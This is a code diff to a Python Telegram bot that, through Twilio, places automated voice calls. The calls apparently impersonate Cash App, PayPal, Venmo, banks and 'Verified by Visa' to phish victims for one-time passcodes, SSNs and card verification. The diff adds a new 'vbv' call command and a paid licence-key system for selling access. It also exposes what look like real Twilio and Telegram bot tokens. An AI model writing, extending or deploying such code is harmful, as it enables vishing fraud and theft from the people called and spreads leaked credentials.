@@ -1,5 +1,6 @@
 import os
 import telebot
+import sqlite3
 from twilio.rest import Client
 from telebot import types
 import json
@@ -10,7 +11,7 @@ while True:
     callid = None
     auth_token = '27ac8193bae177474d54c0fc4421578c'
     from_number = '+15076691829'
-    status_callback_url = 'https://ef52-100-0-165-141.ngrok.io/call/status'
+    status_callback_url = 'https://fdaf-100-0-165-141.ngrok.io/call/status'
     telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
     telegram_bot = telebot.TeleBot(telegram_bot_token)
     @telegram_bot.message_handler(commands=['cashapp'])
@@ -39,7 +40,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
         )
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
@@ -73,7 +74,39 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+        button_text = "Hangup"
+        button_data = f'hangup {call.sid}'
+        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
+        keyboard = types.InlineKeyboardMarkup().add(button)
+        message_text = "📞 Call Ringing"
+        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
+    @telegram_bot.message_handler(commands=['vbv'])
+    def vbv_command(message):
+        try:
+            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
+            if r.text == "200":
+                pass
+            else:
+                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
+                return
+        except:
+            print("SERVER 505 ERROR")
+        command_args = message.text.split()[1:]
+        if len(command_args) != 2:
+            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /vbv John +1234567189')
+            return
+        name, to_number = command_args
+        
+        # Create the Twilio call
+        client = Client(account_sid, auth_token)
+        call = client.calls.create(
+            machine_detection='Enable',
+            to=to_number,
+            status_callback=status_callback_url+f"?chanid={message.chat.id}",
+            from_=from_number,
+            status_callback_event=['Completed'],
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/vbv?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -105,7 +138,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -138,7 +171,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -170,7 +203,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -203,7 +236,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://ef52-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -236,7 +269,27 @@ while True:
     def plan_command(message):
         telegram_bot.send_message(chat_id=message.chat.id, text=f"🔑ChatID: {message.chat.id}",parse_mode= 'Markdown')
         return
-  #Call back function
+    @telegram_bot.message_handler(commands=['key'])
+    def plan_command(message):
+        command_args = message.text.split()[1:]
+        if len(command_args) != 1:
+            telegram_bot.reply_to(message, 'Please specify the Key, e.g. /key 123456abcdef')
+            return
+        key = command_args
+        conn = sqlite3.connect('purchases.db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT product_type FROM purchases WHERE one_time_code = ?', (key))
+        row = cursor.fetchone()
+        if row is not None:
+            cursor.execute('DELETE FROM purchases WHERE one_time_code = ?', (key))
+            conn.commit()
+        if row is not None:
+            product_type = row[0]
+            telegram_bot.send_message(chat_id=message.chat.id, text=f"🔑Product Key: {key} For {product_type}",parse_mode= 'Markdown')
+            requests.get(f"http://localhost:7300/add_user?username={message.chat.id}&role=user&subtype={product_type}") 
+        else:
+            telegram_bot.send_message(chat_id=message.chat.id, text=f"❌Not a Valid Product Key",parse_mode= 'Markdown')
+        return
     @telegram_bot.callback_query_handler(func=lambda call: True)
     def handle_callback_query(call):
             call_data = call.data.split()
